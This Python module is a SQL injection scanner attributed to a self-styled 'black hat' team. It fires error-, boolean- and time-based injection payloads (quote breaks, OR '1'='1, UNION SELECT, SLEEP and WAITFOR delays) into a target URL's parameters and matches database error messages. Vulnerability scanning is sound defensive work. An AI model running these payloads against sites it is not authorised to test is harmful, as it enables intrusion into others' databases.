# modules/vuln_scanner/sqli_scanner.py

"""
SQL Injection Scanner
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Detects SQL injection vulnerabilities using error-based,
boolean-based, and time-based detection techniques.
"""

import re
import time
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urlencode, urlparse, parse_qs

import requests
from requests.exceptions import RequestException, Timeout, ConnectionError


class SQLiScanner:
    """
    SQL Injection vulnerability scanner.
    
    Tests for SQL injection using multiple detection
    methods including error, boolean, and time-based.
    """
    
    SQLI_PAYLOADS = {
        'error_based': [
            "'",
            '"',
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1' OR '1'='1' --",
            "admin' --",
            "' UNION SELECT NULL--",
        ],
        'boolean_based': [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND 'a'='a' --", "' AND 'a'='b' --"),
        ],
        'time_based': [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND pg_sleep(5)--",
        ],
    }
    
    SQL_ERROR_PATTERNS = [
        r'SQL syntax.*MySQL',
        r'Warning.*mysql_.*',
        r'MySQLSyntaxErrorException',
        r'valid MySQL result',
        r'PostgreSQL.*ERROR',
        r'Warning.*pg_.*',
        r'valid PostgreSQL result',
        r'ORA-\d+',
        r'SQLite.*error',
        r'SQLite3::',
        r'unclosed quotation mark',
        r'Microsoft OLE DB Provider for SQL Server',
        r'ODBC Driver.*SQL Server',
        r'Unclosed quotation mark after the character string',
        r'You have an error in your SQL syntax',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the SQLi scanner.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target.rstrip('/') if target else ''
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 10)
        self.verify_ssl = self.config.get('verify_ssl', False)
        self.delay = self.config.get('delay', 0)
        self.max_parameters = self.config.get('max_parameters', 20)
        
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.errors: List[str] = []
        self.scan_status: str = 'initialized'
        self._tested_count: int = 0
    
    def _safe_get_response_text(self, response: Optional[requests.Response]) -> str:
        """Safely get response text with fallback."""
        if response and hasattr(response, 'text'):
            return response.text or ''
        return ''
    
    def _safe_get_response_content(self, response: Optional[requests.Response]) -> bytes:
        """Safely get response content with fallback."""
        if response and hasattr(response, 'content'):
            return response.content or b''
        return b''
    
    def _is_valid_response(self, response: Optional[requests.Response]) -> bool:
        """Check if response is valid for analysis."""
        if response is None:
            return False
        if not hasattr(response, 'status_code'):
            return False
        return True
    
    def _validate_parameters(self, params: Dict[str, str]) -> Tuple[bool, str]:
        """
        Validate parameters before testing.
        
        Args:
            params: Dictionary of parameters
            
        Returns:
            Tuple of (is_valid, message)
        """
        if not params:
            return False, "No parameters found in URL"
        
        if len(params) > self.max_parameters:
            return False, f"Too many parameters ({len(params)} > {self.max_parameters})"
        
        return True, ""
    
    def _safe_extract_parameters(self, url: str) -> Dict[str, str]:
        """
        Safely extract URL parameters with error handling.
        
        Args:
            url: Target URL
            
        Returns:
            Dictionary of parameters
        """
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            param_dict = {}
            for key, values in params.items():
                if values and values[0]:
                    param_dict[key] = values[0]
                else:
                    param_dict[key] = ''
            
            return param_dict
            
        except Exception as e:
            self.errors.append(f"Failed to extract parameters: {str(e)}")
            return {}
    
    def extract_parameters(self, url: str) -> Dict[str, str]:
        """
        Extract URL parameters.
        
        Args:
            url: Target URL
            
        Returns:
            Dictionary of parameters
        """
        return self._safe_extract_parameters(url)
    
    def _normalize_payload(self, payload: str) -> str:
        """Clean and normalize payload."""
        return payload.strip()
    
    def send_payload(self, url: str, parameter: str, payload: str) -> Optional[requests.Response]:
        """
        Send SQL injection payload.
        
        Args:
            url: Target URL
            parameter: Parameter to inject
            payload: SQL payload
            
        Returns:
            HTTP response or None
        """
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = self.extract_parameters(url)
            
            if parameter not in params:
                params[parameter] = ''
            
            normalized_payload = self._normalize_payload(payload)
            params[parameter] = normalized_payload
            
            test_url = base_url + '?' + urlencode(params)
            
            response = self.session.get(
                test_url,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            if self.delay > 0:
                time.sleep(self.delay)
            
            return response
            
        except Timeout:
            return None
        except ConnectionError:
            return None
        except RequestException:
            return None
        except Exception:
            return None
    
    def _check_response_for_errors(self, response_text: str) -> Optional[str]:
        """
        Check response for SQL error patterns.
        
        Args:
            response_text: HTTP response text
            
        Returns:
            Matched pattern or None
        """
        if not response_text:
            return None
        
        for pattern in self.SQL_ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return pattern
        
        return None
    
    def test_error_based(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test for error-based SQL injection.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        for payload in self.SQLI_PAYLOADS['error_based']:
            response = self.send_payload(url, parameter, payload)
            self._tested_count += 1
            
            if self._is_valid_response(response):
                response_text = self._safe_get_response_text(response)
                
                if response_text:
                    matched_pattern = self._check_response_for_errors(response_text)
                    
                    if matched_pattern:
                        return {
                            'url': url,
                            'parameter': parameter,
                            'type': 'error_based',
                            'payload': payload,
                            'error_matched': matched_pattern,
                            'status_code': response.status_code,
                        }
        
        return None
    
    def test_boolean_based(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test for boolean-based blind SQL injection.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        for true_payload, false_payload in self.SQLI_PAYLOADS['boolean_based']:
            true_response = self.send_payload(url, parameter, true_payload)
            self._tested_count += 1
            
            if self.delay > 0:
                time.sleep(self.delay)
            
            false_response = self.send_payload(url, parameter, false_payload)
            self._tested_count += 1
            
            if self._is_valid_response(true_response) and self._is_valid_response(false_response):
                true_content = self._safe_get_response_content(true_response)
                false_content = self._safe_get_response_content(false_response)
                
                if true_content and false_content:
                    if len(true_content) != len(false_content):
                        return {
                            'url': url,
                            'parameter': parameter,
                            'type': 'boolean_based',
                            'payload': true_payload,
                            'true_length': len(true_content),
                            'false_length': len(false_content),
                            'true_status': true_response.status_code,
                            'false_status': false_response.status_code,
                        }
                elif true_content or false_content:
                    # One response has content, the other doesn't
                    return {
                        'url': url,
                        'parameter': parameter,
                        'type': 'boolean_based',
                        'payload': true_payload,
                        'true_length': len(true_content),
                        'false_length': len(false_content),
                        'true_status': true_response.status_code,
                        'false_status': false_response.status_code,
                    }
        
        return None
    
    def test_time_based(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test for time-based blind SQL injection.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        for payload in self.SQLI_PAYLOADS['time_based']:
            start_time = time.time()
            response = self.send_payload(url, parameter, payload)
            self._tested_count += 1
            elapsed = time.time() - start_time
            
            if self._is_valid_response(response) and elapsed >= 4.5:
                return {
                    'url': url,
                    'parameter': parameter,
                    'type': 'time_based',
                    'payload': payload,
                    'response_time': f'{elapsed:.2f}s',
                    'status_code': response.status_code,
                }
        
        return None
    
    def _get_parameter_count(self) -> int:
        """Get number of parameters in target URL."""
        params = self.extract_parameters(self.target)
        return len(params)
    
    def run(self) -> Dict[str, Any]:
        """
        Run SQL injection scan.
        
        Returns:
            Dictionary with scan results
        """
        # Reset state
        self.vulnerabilities.clear()
        self.errors.clear()
        self._tested_count = 0
        self.scan_status = 'running'
        
        # Validate target
        if not self.target:
            self.errors.append("Target URL is empty")
            self.scan_status = 'failed'
            return {
                'findings': [],
                'errors': self.errors,
                'vulnerabilities_found': 0,
                'scan_status': 'failed',
                'error': 'Target URL is empty',
            }
        
        # Extract parameters
        params = self.extract_parameters(self.target)
        
        # Validate parameters
        valid, message = self._validate_parameters(params)
        if not valid:
            self.errors.append(message)
            self.scan_status = 'completed'
            return {
                'findings': [],
                'errors': self.errors,
                'vulnerabilities_found': 0,
                'scan_status': 'completed',
                'parameters_found': 0,
                'tests_performed': 0,
                'message': message,
            }
        
        if not params:
            self.errors.append("No parameters found in URL")
            self.scan_status = 'completed'
            return {
                'findings': [],
                'errors': self.errors,
                'vulnerabilities_found': 0,
                'scan_status': 'completed',
                'parameters_found': 0,
                'tests_performed': 0,
                'message': 'No parameters found in URL',
            }
        
        # Test each parameter
        for param_name in params:
            # Skip empty parameter values
            if not params[param_name] and params[param_name] != '':
                continue
            
            # Error-based
            error_result = self.test_error_based(self.target, param_name)
            
            if error_result:
                self.vulnerabilities.append(error_result)
                continue
            
            # Boolean-based
            boolean_result = self.test_boolean_based(self.target, param_name)
            
            if boolean_result:
                self.vulnerabilities.append(boolean_result)
                continue
            
            # Time-based
            time_result = self.test_time_based(self.target, param_name)
            
            if time_result:
                self.vulnerabilities.append(time_result)
                continue
        
        self.scan_status = 'completed'
        
        findings = []
        
        for vuln in self.vulnerabilities:
            severity = 'critical' if vuln['type'] in ['error_based', 'union_based'] else 'high'
            
            findings.append({
                'type': f'SQL Injection ({vuln["type"]})',
                'severity': severity,
                'endpoint': vuln['url'],
                'parameter': vuln['parameter'],
                'description': f"SQL injection detected via {vuln['type']} in parameter '{vuln['parameter']}'",
                'evidence': vuln,
                'remediation': 'Use parameterized queries, prepared statements, and input validation',
            })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'vulnerabilities_found': len(findings),
            'scan_status': self.scan_status,
            'parameters_found': len(params),
            'tests_performed': self._tested_count,
            'vulnerable_parameters': len(self.vulnerabilities),
        }
